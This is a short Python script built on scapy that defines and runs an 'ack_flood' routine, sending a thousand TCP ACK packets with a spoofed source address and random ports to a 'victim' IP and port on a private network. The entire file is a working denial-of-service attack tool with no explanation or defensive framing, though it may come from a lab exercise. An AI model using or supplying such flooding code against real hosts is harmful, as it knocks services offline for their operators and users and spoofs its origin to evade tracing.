import sys
from scapy.all import *
import random
import time

def ack_flood(victim_ip,victim_port, packet_count=1000):

 for _ in range(packet_count):
  src_port = random.randint(1024,65535)
  ack_packet = IP(src="192.168.28.203", dst=victim_ip)/TCP(sport=src_port, dport=victim_port,flags="A")
  send(ack_packet)
  time.sleep(0.01)

ack_flood("192.168.28.27", 3333, packet_count=1000)


